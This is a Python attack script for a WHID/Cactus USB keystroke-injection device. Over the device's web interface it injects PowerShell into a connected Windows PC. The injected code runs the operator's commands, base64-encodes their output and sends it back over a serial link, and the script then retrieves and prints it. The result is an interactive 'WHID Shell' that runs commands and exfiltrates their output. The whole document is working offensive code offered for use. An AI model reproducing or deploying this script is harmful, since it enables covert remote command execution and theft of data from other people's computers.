import requests
import time
import base64

from requests.auth import HTTPBasicAuth

creds = HTTPBasicAuth("admin", "hacktheplanet")
url = "http://192.168.1.1"
delay = 3

# INITIALISATION AND DETECTION OF THE PORT
print("SETTING UP COM PORT ...")
to_send = '$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\CIMV2" -Filter "PNPDeviceID like \'%VID_1b4f&PID_9208%\'").Caption;'
to_send += '$com=[regex]::match($s,\'COM([0-9]+)\').Value;'
to_send += '$WHIDport= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one;'
to_send += 'echo "" > $env:TEMP\\tmp; echo "" > $env:TEMP\\tmp2; '
requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: {to_send}', "livepayloadpresent": "1"})
time.sleep(delay)

# DELETE EXFIL-FILE TO START FRESH
requests.get(f"{url}/deletepayload/yes?payload=/SerialEXFIL.txt")

cmd = ""
while cmd != "exit":
    cmd = input("WHID Shell> ").strip()

    # BUILD COMMAND AND SEND IT
    # Clear temp. files
    to_send = f'({cmd}) > $env:TEMP\\tmp2 2>&1; echo "DONE!" >> $env:TEMP\\tmp2; '
    # Get output and append dummy output for commands without output
    to_send += 'cat $env:TEMP\\tmp2 | Out-File -Encoding "UTF8" $env:TEMP\\tmp; rm $env:TEMP\\tmp2; '
    # Remove whritespaces from the end of the lines
    to_send += 'foreach($line in Get-Content $env:TEMP\\tmp){ echo $line.TrimEnd() | Out-File -Append -Encoding "UTF8" $env:TEMP\\tmp2; } '
    # Convert into Base64
    to_send += '$res = [convert]::ToBase64String((Get-Content -Path $env:TEMP\\tmp2 -Encoding byte)); '
    # Split into 100 byte chunks
    to_send += '$res -Split "(.{100})" | ?{$_} > $env:TEMP\\tmp; echo "!!!END!!!" >> $env:TEMP\\tmp; '
    # Send code
    to_send += '$WHIDport.open(); '
    to_send += 'foreach($line in Get-Content $env:TEMP\\tmp){ $WHIDport.WriteLine("SerialEXFIL:$line"); Start-Sleep -Milliseconds 1500; } '
    to_send += '$WHIDport.Close();'
    # Send command to PC
    requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: {to_send}', "livepayloadpresent": "1"})
    time.sleep(delay)

    # READ EXFILTRATED DATA
    res = ""
    while "!!!END!!!" not in res:
        res = requests.get(f"{url}/SerialEXFIL.txt", auth=creds).text
        print(f"Got {len(res)} bytes", end="\r", flush=True)
        time.sleep(delay)

    # REMOVE BYTE COUNTER
    print(" "*30, end="\r", flush=True)
        
    # DECODE BASE64 AND DISPLAY OUTPUT
    b64 = res.replace("\r", "").replace("!!!END!!!", "").replace("\r", "").replace("\n", "").strip().encode("ascii")
    for line in base64.b64decode(b64).decode("UTF-8-SIG").replace("\r", "").split("\n"):
        print(line.rstrip())


    # DELETE EXFILTRATED DATA FROM CACTUS
    requests.get(f"{url}/deletepayload/yes?payload=/SerialEXFIL.txt")
    print("-"*30 + "\n")
    
